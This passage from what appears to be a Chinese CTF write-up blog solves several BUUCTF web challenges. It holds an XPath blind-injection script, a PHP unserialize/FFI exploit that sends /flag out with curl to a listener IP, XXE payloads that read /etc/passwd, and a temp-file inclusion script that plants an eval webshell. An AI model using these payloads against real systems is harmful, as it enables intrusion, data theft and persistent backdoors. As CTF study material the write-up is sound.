rel="noopener">https://xz.aliyun.com/t/7791#toc-6</a></p><p>直接上脚本吧，这里因为token的时效很短，要保持会话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url =<span class="string">'http://f2f0fd0b-5efb-43ed-9e9b-9a0c13588c15.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span></span><br><span class="line">&#125;</span><br><span class="line">find =re.compile(<span class="string">'&lt;input type="hidden" id="token" value="(.*?)" /&gt;'</span>)</span><br><span class="line"></span><br><span class="line">strs =<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload_1 = <span class="string">"&lt;username&gt;'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        payload_2 = <span class="string">"&lt;username&gt;'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        payload_3 =<span class="string">"&lt;username&gt;'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        payload_4 =<span class="string">"&lt;username&gt;'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        payload_username =<span class="string">"&lt;username&gt;'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        payload_password =<span class="string">"&lt;username&gt;'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;"</span>.format(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload_username)</span></span><br><span class="line">        r = s.post(url=url,headers=head,data=payload_password)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"非法操作"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)//防止访问过快报错</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"用户名或密码错误!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#跑出来账号adm1你、，密码cf7414b5bdb2e65ee43083f4ddbc4d9f，解密是gtfly123</span></span><br></pre></td></tr></table></figure><p>登录之后是一个文件包含，源码给了提示flag在/flag下</p><p>file伪协议进行读取，弹出NONONO，应该是有WAF，经过测试php，read,base都被过滤了，这里可以用大小写绕过，源码处拿到了base64加密的数据</p><img src="/2020/07/02/taoisms/9.png" class=""><h3 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个源码的时候一乐，感觉有很大的操作空间，先来看看phpinfo()配置情况，收集信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP Version <span class="number">7.4</span><span class="number">.0</span>-dev</span><br><span class="line"></span><br><span class="line">open_basedir：/<span class="keyword">var</span>/www/html</span><br><span class="line">    </span><br><span class="line">opcache.preload：/<span class="keyword">var</span>/www/html/preload.php</span><br><span class="line"></span><br><span class="line">开启了FFI</span><br><span class="line"></span><br><span class="line">disable_functions:set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure><p>可以看出基本上所有的命令执行函数都被ban了，那就没想象中那么简单了，看了一下var_dump和scandir还是能用的，那就先来读一下www目录下的文件</p><img src="/2020/07/02/taoisms/10.png" class=""><p>有一个preload.php可以访问，用show_source或者file_get_contents读取一下    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计，只要用到run()函数就能够执行print_r($arg),下面就是触及到知识盲区了</p><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。更多细节可以阅读：<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> ，允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展，但是文档中说了 <strong>FFI</strong> 是一个危险的拓展，而这道题目却开启了 <strong>FFI</strong> 拓展。下面是文档里的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php </span><br><span class="line"><span class="comment">//创建FFI对象，加载libc并导出函数printf（）</span></span><br><span class="line">$ ffi  = FFI :: cdef （</span><br><span class="line">    “ int printf（<span class="keyword">const</span> char * format，...）;” ， <span class="comment">//这是常规的C声明</span></span><br><span class="line">    “ libc .so<span class="number">.6</span>“ ）; </span><br><span class="line"><span class="comment">//呼叫C printf（）</span></span><br><span class="line">$ ffi- &gt; printf（“ Hello ％s！\ n ” ， “ world” ）;</span><br></pre></td></tr></table></figure><p>到这里就可以构造exp了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">"int php_exec(int type, char *cmd);"</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="comment">#?a=$a=unserialize('C%3a1%3a"A"%3a97%3a&#123;a%3a3%3a&#123;s%3a3%3a"ret"%3bN%3bs%3a4%3a"func"%3bs%3a9%3a"FFI%3a%3acdef"%3bs%3a3%3a"arg"%3bs%3a34%3a"int+php_exec(int+type,+char+*cmd)%3b"%3b&#125;&#125;');var_dump($a-&gt;ret-&gt;php_exec(2,'curl%20174.2.6.5:7777/`cat%20/flag`'));</span></span><br></pre></td></tr></table></figure><p>buu内网开一台靶机监听端口就能反弹flag</p><h3 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h3><p>扫描没有任何信息，抓包，json数据格式</p><img src="/2020/07/02/taoisms/13.png" class=""><p>尝试注入，没有任何反馈，思路卡住，以为会是模板注入，然而也不是</p><p>看了wp，原来是XXE，把数据改成XML的形式传过去，报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Validation failed: no DTD found !, line 1, column 9</span><br></pre></td></tr></table></figure><p>缺少dtd实体，那这题要用xxe的dtd实体注入没跑了，这里要注意对%进行编码转换</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string"></span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/07/02/taoisms/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/02/taoisms/12.png" class=""><p>flag到手</p><h3 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h3><img src="/2020/07/02/taoisms/14.png" class=""><p>有提示，随便给name和pass赋值，抓包</p><img src="/2020/07/02/taoisms/15.png" class=""><p>这里好像暴露了pass，有一点小疑问，没有一开始就给了源码，在name和pass对了之后才能读取到源码</p><img src="/2020/07/02/taoisms/16.png" class=""><p>访问flflflflag.php页面，发现会重定向跳转，用burp访问，读取index.php</p><img src="/2020/07/02/taoisms/17.png" class=""><p>扫描目录有一个dir.php，访问，列出了tmp目录下的文件信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dir.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>到这里卡住了，看了wh1sper师傅的wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里考察的是PHP临时文件包含，其基本是两种情况：</span><br><span class="line">利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除</span><br><span class="line">PHP版本&lt;7.2，利用php崩溃留下临时文件</span><br></pre></td></tr></table></figure><p>网上找的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url = <span class="string">"http://b432da54-714c-46a4-aa62-1b52953d99f1.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>跑完之后再去访问dir.php，查看文件名，在去访问tmp目录下对应的文件</p><img src="/2020/07/02/taoisms/18.png" class=""><h3 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h3><p>开题有个点击链接，点击没什么反应，以为会是php，但是不是，伪协议读取失败</p><p>尝试python，成了，是flask</p><img src="/2020/07/02/taoisms/19.png" class=""><p>整理一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib <span class="keyword">from</span> flask </span><br><span class="line"><span class="keyword">import</span> Flask, session, request a</span><br><span class="line">pp = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) //uuid.getnode()获取主机MAC地址  <span class="number">02</span>:<span class="number">42</span>:ae:<span class="number">02</span>:<span class="number">08</span>:c5</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">    m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">    n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">or</span> n: <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">        res = urllib.urlopen(url) </span><br><span class="line">        <span class="keyword">return</span> res.read() </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">            <span class="keyword">print</span> str(ex) <span class="keyword">return</span> <span class="string">'no response'</span> @</span><br><span class="line">app.route(<span class="string">'/flag'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span 